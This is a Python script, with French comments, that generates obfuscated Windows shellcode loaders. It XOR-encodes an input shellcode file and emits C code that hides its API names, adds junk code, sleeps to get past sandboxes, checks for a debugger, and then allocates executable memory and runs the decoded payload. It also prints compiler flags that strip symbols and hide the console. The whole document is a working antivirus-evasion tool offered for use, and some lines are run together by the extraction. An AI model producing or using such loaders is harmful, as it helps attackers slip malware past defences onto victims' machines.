#!/usr/bin/env python3
import sysimport random
import string
import os
def random_var_name(length=8):
"""Génère un nom de variable aléatoire"""
return ''.join(random.choices(string.ascii_letters, k=length))
def random_key(length=16):
"""Génère une clé XOR aléatoire"""
return bytes([random.randint(1, 255) for _ in range(length)])
def xor_encode(data, key):
"""Encode avec XOR"""
encoded = bytearray()
for i, byte in enumerate(data):
encoded.append(byte ^ key[i % len(key)])
return bytes(encoded)
def string_to_hex_array(data):
"""Convertit bytes en tableau C hexadécimal"""
hex_values = [f'0x{b:02x}' for b in data]
# Formater sur plusieurs lignes pour lisibilité
lines = []
for i in range(0, len(hex_values), 12):
lines.append('
' + ', '.join(hex_values[i:i+12]))
return ',\n'.join(lines)
def generate_junk_code():
"""Génère du code inutile pour brouiller l'analyse"""
junk_vars = [random_var_name() for _ in range(3)]
junk = f'''
// Code légitime simulé
int {junk_vars[0]} = {random.randint(1000, 9999)};
int {junk_vars[1]} = {junk_vars[0]} * {random.randint(2, 10)};
char {junk_vars[2]}[64];
sprintf({junk_vars[2]}, "Config_%d", {junk_vars[1]});
'''
return junk
def xor_string(s):
"""Encode une string avec XOR simple"""
key = random.randint(1, 255)
encoded = [c ^ key for c in s.encode()]
return encoded, key
def generate_obfuscated_loader(shellcode, xor_key):
"""Génère le code C fortement obfusqué"""# Noms de variables aléatoires
var_encoded = random_var_name()
var_key = random_var_name()
var_decoded = random_var_name()
var_size = random_var_name()
var_kernel = random_var_name()
var_addr = random_var_name()
var_func1 = random_var_name()
var_func2 = random_var_name()
var_old = random_var_name()
var_idx = random_var_name()
# Encoder les noms d'API Windows
api_va = "VirtualAlloc"
api_vp = "VirtualProtect"
api_k32 = "kernel32.dll"
encoded_va, key_va = xor_string(api_va)
encoded_vp, key_vp = xor_string(api_vp)
encoded_k32, key_k32 = xor_string(api_k32)
# Convertir shellcode et clé
shellcode_hex = string_to_hex_array(shellcode)
key_hex = string_to_hex_array(xor_key)
# Sleep aléatoire (2-5 secondes)
sleep_time = random.randint(2000, 5000)
# Junk code
junk1 = generate_junk_code()
junk2 = generate_junk_code()
template = f'''#include <windows.h>
#include <stdio.h>
#include <string.h>
// Types pour les fonctions système
typedef LPVOID (WINAPI *Type_{var_func1})(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *Type_{var_func2})(LPVOID, SIZE_T, DWORD, PDWORD);
// Données encodées
unsigned char {var_encoded}[] = {{
{shellcode_hex}
}};
unsigned char {var_key}[] = {{
{key_hex}
}};// Fonction de décodage de strings
void decode_str(unsigned char *enc, int len, unsigned char key, char *out) {{
for(int i = 0; i < len; i++) {{
out[i] = enc[i] ^ key;
}}
out[len] = '\\0';
}}
int main() {{
{junk1}
// Décodage des noms d'API
unsigned char enc_k32[] = {{ {', '.join(f'0x{b:02x}' for b in
encoded_k32)} }};
unsigned char enc_va[] = {{ {', '.join(f'0x{b:02x}' for b in encoded_va)}
}};
unsigned char enc_vp[] = {{ {', '.join(f'0x{b:02x}' for b in encoded_vp)}
}};
char str_k32[32], str_va[32], str_vp[32];
decode_str(enc_k32, {len(encoded_k32)}, 0x{key_k32:02x}, str_k32);
decode_str(enc_va, {len(encoded_va)}, 0x{key_va:02x}, str_va);
decode_str(enc_vp, {len(encoded_vp)}, 0x{key_vp:02x}, str_vp);
// Anti-sandbox: attente
Sleep({sleep_time});
{junk2}
// Chargement dynamique des fonctions
HMODULE {var_kernel} = GetModuleHandleA(str_k32);
if (!{var_kernel}) return 1;
Type_{var_func1} {var_func1} =
(Type_{var_func1})GetProcAddress({var_kernel}, str_va);
Type_{var_func2} {var_func2} =
(Type_{var_func2})GetProcAddress({var_kernel}, str_vp);
if (!{var_func1} || !{var_func2}) return 1;
// Taille des données
int {var_size} = sizeof({var_encoded});
unsigned char {var_decoded}[sizeof({var_encoded})];
// Décodage XOR avec boucle obfusquée
for(int {var_idx} = 0; {var_idx} < {var_size}; {var_idx}++) {{
{var_decoded}[{var_idx}] = {var_encoded}[{var_idx}] ^
{var_key}[{var_idx} % sizeof({var_key})];
}}// Allocation mémoire (d'abord non-exécutable)
LPVOID {var_addr} = {var_func1}(0, {var_size}, MEM_COMMIT | MEM_RESERVE,
PAGE_READWRITE);
if (!{var_addr}) return 1;
// Copie des données
memcpy({var_addr}, {var_decoded}, {var_size});
// Changement des permissions
DWORD {var_old};
{var_func2}({var_addr}, {var_size}, PAGE_EXECUTE_READ, &{var_old});
// Vérification anti-debug simple
if (IsDebuggerPresent()) {{
return 0;
}}
// Exécution
void (*exec_func)() = (void(*)()){var_addr};
exec_func();
return 0;
}}
'''
return template
def main():
if len(sys.argv) < 2:
print("Usage: python3 advanced_obfuscator.py <shellcode.bin>")
print("\nCe script génère un payload fortement obfusqué avec:")
print(" - Noms de variables aléatoires")
print(" - Clé XOR aléatoire")
print(" - API Windows encodées")
print(" - Junk code")
print(" - Anti-sandbox/anti-debug")
sys.exit(1)
# Lecture du shellcode
shellcode_file = sys.argv[1]
if not os.path.exists(shellcode_file):
print(f"[!] Erreur: fichier {shellcode_file} introuvable")
sys.exit(1)
with open(shellcode_file, 'rb') as f:
shellcode = f.read()
print("[*] Génération du payload obfusqué...")# Génération d'une clé XOR aléatoire
xor_key = random_key(16)
# Encodage du shellcode
encoded_shellcode = xor_encode(shellcode, xor_key)
# Génération du code C obfusqué
c_code = generate_obfuscated_loader(encoded_shellcode, xor_key)
# Sauvegarde
output_c = "obfuscated_payload.c"
with open(output_c, 'w') as f:
f.write(c_code)
# Sauvegarde de la clé (pour référence)
with open('xor_key.txt', 'w') as f:
f.write(xor_key.hex())
print(f"[+] Shellcode original: {len(shellcode)} bytes")
print(f"[+] Shellcode encodé: {len(encoded_shellcode)} bytes")
print(f"[+] Clé XOR: {xor_key.hex()}")
print(f"[+] Fichier généré: {output_c}")
print(f"\n[*] Compilation:")
print(f"
i686-w64-mingw32-gcc {output_c} -o obfuscated.exe -s -O2")
print(f"\n[*] Options de compilation recommandées:")
print(f"
-s : strip symbols (retire les symboles de debug)")
print(f"
-O2 : optimisation (change la structure du code)")
print(f"
-mwindows : pas de console (mode GUI)")
print(f"\n[!] IMPORTANT: Chaque exécution génère un payload UNIQUE")
if __name__ == "__main__":
main()